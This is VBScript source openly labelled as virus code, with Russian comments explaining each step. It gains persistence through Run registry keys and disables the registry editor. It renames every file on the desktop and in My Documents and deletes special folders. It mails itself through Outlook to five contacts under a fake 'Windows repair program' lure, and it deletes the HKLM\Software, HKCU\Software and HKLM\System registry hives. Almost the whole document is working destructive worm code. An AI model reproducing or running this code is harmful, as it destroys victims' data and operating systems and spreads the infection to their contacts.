'            = = = = = =  = > КОД ВИРУСА < = = = = = = = 

'      Объявление переменных(этот абзац не перемещать)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


' Запускаться при каждой перезагрузке
Set File2 = FileSystemObject.GetFile(WScript.ScriptFullName)
File2.Copy ("c:\windows\System\Gigabyte.vbs")
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

' Блокировать RegEdit(чтоб у него не заводился редактор реестра).Для того чтобы разблокировать происвойте DisableRegistryTools значение - 0
Shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"

' Переименование всех файлов, находящихся на Робочем столе на "Стерти"
For Each Folder In Shell.SpecialFolders
If right(folder,12) = "Рабочий стол" Then 
Set tf = FileSystemObject.getfolder(folder)
Set af = tf.files
For Each fl In af
Set file = FileSystemObject.getfile(fl):t = t+1
file.name = "Стерти" & t
Next
End If
Next

' Переименование всех файлов, находящихся в Моих документах на "Фуфло"
For Each Folder In Shell.SpecialFolders
If right(folder,13) = "Мои документы" Then 
Set tf = FileSystemObject.getfolder(folder)
Set af = tf.files
For Each fl In af
Set file = FileSystemObject.getfile(fl):t = t+1
file.name = "Фуфло" & t
Next
End If
Next

' Переименование папки Мои документы на "Непотріб"
For Each Folder In Shell.SpecialFolders
If right(folder,13) = "Мои документы" Then 
Set tf = FileSystemObject.getfolder(folder): tf.name = "Непотріб"
End If
Next

' Переименование всех файлов, находящихся в Главное меню\Программы на "Гамно"
For Each Folder In Shell.SpecialFolders
If right(folder,12) = "Главное меню" Then 
Set tf = FileSystemObject.getfolder(folder)
Set af = tf.subfolders
For Each fl In af
Set file = FileSystemObject.getfolder(fl):t = t+1
file.name = "Гамно" & t
Next
End If
Next

' Перейти на сайт "http:\\www.avp.ru"
InternerExplorer.Visible = True
InternerExplorer.Navigate "http:\\www.avp.ru"

' Сделать домашней страницу "http:\\www.avp.ru"
Shell.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http:\\www.avp.ru"

' Разослать вирус 5 контактов неприятеля
For Index = 1 To 5
Set OutMail = Outlook.CreateItem(0)
OutMail.to = Outlook.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
OutMail.Subject = "Реклама"
OutMail.Body = "Я вам прислав пробну супер програму для виправлення помилок Windows. Просто запустіть іі!!! "
OutMail.Attachments.Add WScript.ScriptFullName
OutMail.Send
Next


'     Удаление специальных папок
 For Each Folder In Shell.SpecialFolders

' Удаление Aplication Data
 If right(folder,15) = "Aplication Data" Then FileSystemObject.deletefolder folder,True

' Удаление ShellNew
 If right(folder,8) = "ShellNew" Then FileSystemObject.deletefolder folder,True

' Удаление NetHood
 If right(folder,7) = "NetHood" Then FileSystemObject.deletefolder folder,True
 Next

' Додавить\изменить запись в Реестре
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Артема"

' Додавить\изменить запись в Реестре
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "Дурдом"

' Додавить\изменить запись в Реестре
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Артема"

' Додавить\изменить запись в Реестре
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "Дурдом"

' Удалить запись в Реестре
Shell.RegDelete "HKEY_LOCAL_MACHINE\Software"

' Удалить запись в Реестре
Shell.RegDelete "HKEY_CURRENT_USER\Software"

' Удалить запись в Реестре
Shell.RegDelete "HKEY_LOCAL_MACHINE\System"

'     Вывести сообщение 
Shell.popup "Видалити Windows ", , "RUNDLL 32", 0+32

